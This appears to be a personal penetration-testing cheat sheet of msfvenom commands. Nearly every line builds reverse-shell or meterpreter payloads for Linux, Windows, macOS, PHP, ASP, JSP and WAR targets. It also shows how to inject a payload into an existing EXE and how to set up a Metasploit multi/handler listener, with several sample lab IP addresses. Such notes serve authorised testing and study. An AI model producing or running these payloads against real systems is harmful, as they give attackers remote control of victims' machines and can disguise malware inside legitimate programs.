https://medium.com/@hannahsuarez/full-list-of-546-msfvenom-payloads-39adb4d793c9
https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp

# msfvenom
- serivce: all
- tactics: weaponization

## Linux ELF binary
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

## Windows EXE binary 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

MS17-010
msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.124 LPORT=4445

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.239.155 LPORT=4444 -f aspx -o pwn.aspx
### 32 Bit
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.10.12.XX lport=1337 -f exe > shell32.exe

### 64Bit
msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp lhost=10.10.12.XX lport=1337 -f exe > shell64.exe
    
## Windows Service
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> EXITFUNC=thread -f exe-service > shell-service.exe
    
## Mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
    
## PHP 
msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > /tmp/shell.php && sed -i 's/#<?php/<?php/' /tmp/shell.php
 msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f raw -o shell.php
> If you use php/reverse_php open the output file with an editor and add `<?php` and `?>` within the script.
use exploit/multi/handler 
set LHOST <$LOCAL_IP>
set LPORT <$LOCAL_PORT>
set PAYLOAD php/meterpreter/reverse_tcp 
exploit
    
## ASP 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp 

## JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
    
## WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
    
## Inject payload into an existing exe file
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -x <template EXE> -f exe > <output.exe>

## dep bypass payload
windows/meterpreter/reverse_nonx_tcp

## multi handler
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set AutoRunScript post/windows/manage/migrate
set lhost 10.10.12.102
set lport 9001
exploit
```
--- 
